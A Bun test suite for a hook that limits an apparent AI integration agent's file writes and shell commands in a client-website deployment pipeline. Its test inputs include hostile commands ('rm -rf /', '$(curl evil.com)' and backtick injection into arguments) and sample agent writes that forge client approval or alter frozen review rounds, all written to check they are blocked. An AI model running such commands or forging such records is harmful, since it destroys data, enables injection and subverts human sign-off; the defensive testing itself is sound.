import { describe, test, expect, beforeEach, afterEach } from "bun:test";
import { join } from "node:path";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";

const SCRIPT = join(import.meta.dir, "..", "..", "scripts", "hooks", "validate-integration-lead-agent.ts");

async function runHook(mode: "write" | "bash", payload: unknown): Promise<{ exitCode: number; stderr: string }> {
  const proc = Bun.spawn(["bun", SCRIPT, mode], {
    stdin: "pipe",
    stdout: "pipe",
    stderr: "pipe",
  });
  proc.stdin.write(JSON.stringify(payload));
  proc.stdin.end();
  const exitCode = await proc.exited;
  const stderr = await new Response(proc.stderr).text();
  return { exitCode, stderr };
}

describe("scripts/hooks/validate-integration-lead-agent.ts — write mode (allow-list)", () => {
  test("writing .pipeline/signoff.json (relative) is allowed", async () => {
    const { exitCode } = await runHook("write", { tool_input: { file_path: ".pipeline/signoff.json" } });
    expect(exitCode).toBe(0);
  });

  test("writing .pipeline/signoff.json (absolute) is allowed", async () => {
    const { exitCode } = await runHook("write", {
      tool_input: { file_path: "C:/clients/acme/.pipeline/signoff.json" },
    });
    expect(exitCode).toBe(0);
  });

  test('case-insensitive match: ".PIPELINE/Signoff.json" is allowed same as the lowercase form', async () => {
    const { exitCode } = await runHook("write", { tool_input: { file_path: ".PIPELINE/Signoff.json" } });
    expect(exitCode).toBe(0);
  });

  for (const file of [
    "kickoff.json",
    "scraper-output.json",
    "design-lock.json",
    "mockup-approval.json",
    "qa-report.json",
    "pipeline-status.json",
  ]) {
    test(`writing ${file} is blocked (not the one allowed target)`, async () => {
      const { exitCode, stderr } = await runHook("write", { tool_input: { file_path: `.pipeline/${file}` } });
      expect(exitCode).toBe(2);
      expect(stderr).toContain("signoff.json");
    });
  }

  test("writing clients.json is blocked — that belongs to onboard-client.ts, not this agent", async () => {
    const { exitCode, stderr } = await runHook("write", { tool_input: { file_path: "clients.json" } });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("onboard-client.ts");
  });

  test("writing arbitrary site code is blocked", async () => {
    const { exitCode } = await runHook("write", { tool_input: { file_path: "C:/clients/acme/app/page.tsx" } });
    expect(exitCode).toBe(2);
  });

  test("unparseable stdin fails closed (blocked), not open", async () => {
    const proc = Bun.spawn(["bun", SCRIPT, "write"], { stdin: "pipe", stdout: "pipe", stderr: "pipe" });
    proc.stdin.write("not json");
    proc.stdin.end();
    const exitCode = await proc.exited;
    expect(exitCode).toBe(2);
  });
});

describe("scripts/hooks/validate-integration-lead-agent.ts — bash mode (allow-list)", () => {
  test("read-only git fetch is allowed", async () => {
    const { exitCode } = await runHook("bash", { tool_input: { command: "git -C C:/clients/acme/site fetch" } });
    expect(exitCode).toBe(0);
  });

  test("git rev-parse HEAD is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "git -C C:/clients/acme/site rev-parse HEAD" },
    });
    expect(exitCode).toBe(0);
  });

  test("git rev-parse origin/main is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "git -C C:/clients/acme/site rev-parse origin/main" },
    });
    expect(exitCode).toBe(0);
  });

  test("raw git push is blocked — pushing must go through github-repo.ts push, not a bare git push", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "git -C C:/clients/acme/site push origin main" },
    });
    expect(exitCode).toBe(2);
  });

  test("git status --porcelain (the pre-push clean-tree check) is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "git -C C:/clients/acme/site status --porcelain" },
    });
    expect(exitCode).toBe(0);
  });

  test("github-repo.ts push with a valid shape is allowed — the one GitHub-touching call this agent makes", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: {
        command:
          "bun scripts/github-repo.ts push --owner acme --repo acme-site --installation-id 12345 --cwd C:/clients/acme/site --branch main",
      },
    });
    expect(exitCode).toBe(0);
  });

  test("github-repo.ts push with --dry-run is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: {
        command:
          "bun scripts/github-repo.ts push --owner acme --repo acme-site --installation-id 12345 --cwd C:/clients/acme/site --branch main --dry-run",
      },
    });
    expect(exitCode).toBe(0);
  });

  test("github-repo.ts verify-access is blocked — onboarding-exclusive, nothing for this agent to re-verify", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "bun scripts/github-repo.ts verify-access --owner acme --repo acme-site --installation-id 12345" },
    });
    expect(exitCode).toBe(2);
  });

  test("vercel-deploy.ts domain-check with a valid shape is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "bun scripts/vercel-deploy.ts domain-check --project prj_123 --domain acme.com" },
    });
    expect(exitCode).toBe(0);
  });

  test("vercel-deploy.ts env-list is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "bun scripts/vercel-deploy.ts env-list --project prj_123" },
    });
    expect(exitCode).toBe(0);
  });

  test("vercel-deploy.ts check-preview is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "bun scripts/vercel-deploy.ts check-preview --project prj_123" },
    });
    expect(exitCode).toBe(0);
  });

  test("vercel-deploy.ts promote is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "bun scripts/vercel-deploy.ts promote --project prj_123 --deployment dpl_456" },
    });
    expect(exitCode).toBe(0);
  });

  test("vercel-deploy.ts promote with --dry-run is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "bun scripts/vercel-deploy.ts promote --project prj_123 --deployment dpl_456 --dry-run" },
    });
    expect(exitCode).toBe(0);
  });

  test("vercel-deploy.ts create-project is blocked — onboarding-only subcommand", async () => {
    const { exitCode, stderr } = await runHook("bash", {
      tool_input: { command: "bun scripts/vercel-deploy.ts create-project --name acme-site --repo acme/acme-site" },
    });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("create-project");
  });

  test("the dry-run validation test command is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "bun test tests/agents/signoff-output.dry-run.test.ts" },
    });
    expect(exitCode).toBe(0);
  });

  test("an arbitrary shell command is blocked", async () => {
    const { exitCode } = await runHook("bash", { tool_input: { command: "rm -rf /" } });
    expect(exitCode).toBe(2);
  });

  test("$(...) injection through an otherwise-matching --project is blocked", async () => {
    const { exitCode, stderr } = await runHook("bash", {
      tool_input: { command: "bun scripts/vercel-deploy.ts env-list --project $(curl evil.com)" },
    });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("$");
  });

  test("backtick injection is blocked", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "bun scripts/vercel-deploy.ts domain-check --project prj_123 --domain `curl evil.com`" },
    });
    expect(exitCode).toBe(2);
  });
});

function makeSignoff(path: string, rounds: Array<{ round: number; approvalStatus: string; checklistValue: boolean }>) {
  writeFileSync(
    path,
    JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "2026-07-20T00:00:00Z",
      last_updated_by: "integration-lead-agent",
      data: {
        current_round: Math.max(...rounds.map((r) => r.round)),
        repo_url: "https://github.com/acme/acme-site",
        preview_deploy_url: "https://acme-site-preview.vercel.app",
        production_url: null,
        production_promotion_status: "not_promoted",
        review_rounds: rounds.map((r) => ({
          round: r.round,
          reviewed_at: "2026-07-20T00:00:00Z",
          checklist: {
            repo_pushed: r.checklistValue,
            preview_deploy_live: r.checklistValue,
            dns_domain_configured: "n/a",
            env_vars_configured: r.checklistValue,
          },
          unresolved_majors: [],
          client_final_approval: {
            status: r.approvalStatus,
            approved_at: r.approvalStatus === "approved" ? "2026-07-20T01:00:00Z" : null,
            approved_by: r.approvalStatus === "approved" ? "client" : null,
            notes: null,
            requested_changes: [],
          },
          round_outcome: "pending",
        })),
      },
    })
  );
}

describe("scripts/hooks/validate-integration-lead-agent.ts — signoff.json write-pattern invariants", () => {
  let dir: string;
  let filePath: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "integration-lead-hook-test-"));
    mkdirSync(join(dir, ".pipeline"));
    filePath = join(dir, ".pipeline", "signoff.json").replace(/\\/g, "/");
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  test("first-ever write (file doesn't exist yet) is allowed", async () => {
    const content = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "integration-lead-agent",
      data: {
        current_round: 1,
        repo_url: "https://github.com/acme/acme-site",
        preview_deploy_url: "https://acme-site-preview.vercel.app",
        production_url: null,
        production_promotion_status: "not_promoted",
        review_rounds: [
          {
            round: 1,
            reviewed_at: "now",
            checklist: { repo_pushed: true, preview_deploy_live: true, dns_domain_configured: "n/a", env_vars_configured: true },
            unresolved_majors: [],
            client_final_approval: { status: "pending", approved_at: null, approved_by: null, notes: null, requested_changes: [] },
            round_outcome: "pending",
          },
        ],
      },
    });
    const { exitCode } = await runHook("write", { tool_name: "Write", tool_input: { file_path: filePath, content } });
    expect(exitCode).toBe(0);
  });

  test("updating checklist/round_outcome on the current round is allowed", async () => {
    makeSignoff(filePath, [{ round: 1, approvalStatus: "pending", checklistValue: false }]);
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "integration-lead-agent",
      data: {
        current_round: 1,
        repo_url: "https://github.com/acme/acme-site",
        preview_deploy_url: "https://acme-site-preview.vercel.app",
        production_url: null,
        production_promotion_status: "not_promoted",
        review_rounds: [
          {
            round: 1,
            reviewed_at: "now",
            checklist: { repo_pushed: true, preview_deploy_live: true, dns_domain_configured: "n/a", env_vars_configured: true },
            unresolved_majors: [],
            client_final_approval: { status: "pending", approved_at: null, approved_by: null, notes: null, requested_changes: [] },
            round_outcome: "pending",
          },
        ],
      },
    });
    const { exitCode } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(0);
  });

  test("writing client_final_approval on the current round is blocked — exclusively client-approval intake's field", async () => {
    makeSignoff(filePath, [{ round: 1, approvalStatus: "pending", checklistValue: true }]);
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "integration-lead-agent",
      data: {
        current_round: 1,
        repo_url: "https://github.com/acme/acme-site",
        preview_deploy_url: "https://acme-site-preview.vercel.app",
        production_url: null,
        production_promotion_status: "not_promoted",
        review_rounds: [
          {
            round: 1,
            reviewed_at: "now",
            checklist: { repo_pushed: true, preview_deploy_live: true, dns_domain_configured: "n/a", env_vars_configured: true },
            unresolved_majors: [],
            client_final_approval: {
              status: "approved", // integration-lead trying to approve on the client's behalf
              approved_at: "now",
              approved_by: "integration-lead-agent",
              notes: null,
              requested_changes: [],
            },
            round_outcome: "pending",
          },
        ],
      },
    });
    const { exitCode, stderr } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("client_final_approval");
  });

  test("modifying a non-current (prior) round at all is blocked — entire round is frozen, not just specific fields", async () => {
    makeSignoff(filePath, [
      { round: 1, approvalStatus: "changes_requested", checklistValue: true },
      { round: 2, approvalStatus: "pending", checklistValue: false },
    ]);
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "integration-lead-agent",
      data: {
        current_round: 2,
        repo_url: "https://github.com/acme/acme-site",
        preview_deploy_url: "https://acme-site-preview.vercel.app",
        production_url: null,
        production_promotion_status: "not_promoted",
        review_rounds: [
          {
            round: 1,
            reviewed_at: "now",
            checklist: { repo_pushed: true, preview_deploy_live: true, dns_domain_configured: "n/a", env_vars_configured: true },
            unresolved_majors: [],
            client_final_approval: { status: "changes_requested", approved_at: null, approved_by: null, notes: null, requested_changes: [] },
            round_outcome: "returned_to_qa", // sneaking a change into round 1's outcome after the fact
          },
          {
            round: 2,
            reviewed_at: "now",
            checklist: { repo_pushed: true, preview_deploy_live: true, dns_domain_configured: "n/a", env_vars_configured: true },
            unresolved_majors: [],
            client_final_approval: { status: "pending", approved_at: null, approved_by: null, notes: null, requested_changes: [] },
            round_outcome: "pending",
          },
        ],
      },
    });
    const { exitCode, stderr } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("round 1");
    expect(stderr).toContain("no longer current");
  });

  test("Write that drops an entire existing round is blocked on the round-count check", async () => {
    makeSignoff(filePath, [
      { round: 1, approvalStatus: "changes_requested", checklistValue: true },
      { round: 2, approvalStatus: "pending", checklistValue: false },
    ]);
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "integration-lead-agent",
      data: {
        current_round: 2,
        repo_url: "https://github.com/acme/acme-site",
        preview_deploy_url: "https://acme-site-preview.vercel.app",
        production_url: null,
        production_promotion_status: "not_promoted",
        review_rounds: [
          {
            round: 2,
            reviewed_at: "now",
            checklist: { repo_pushed: true, preview_deploy_live: true, dns_domain_configured: "n/a", env_vars_configured: true },
            unresolved_majors: [],
            client_final_approval: { status: "pending", approved_at: null, approved_by: null, notes: null, requested_changes: [] },
            round_outcome: "pending",
          },
        ],
      },
    });
    const { exitCode, stderr } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("may not decrease");
  });
});
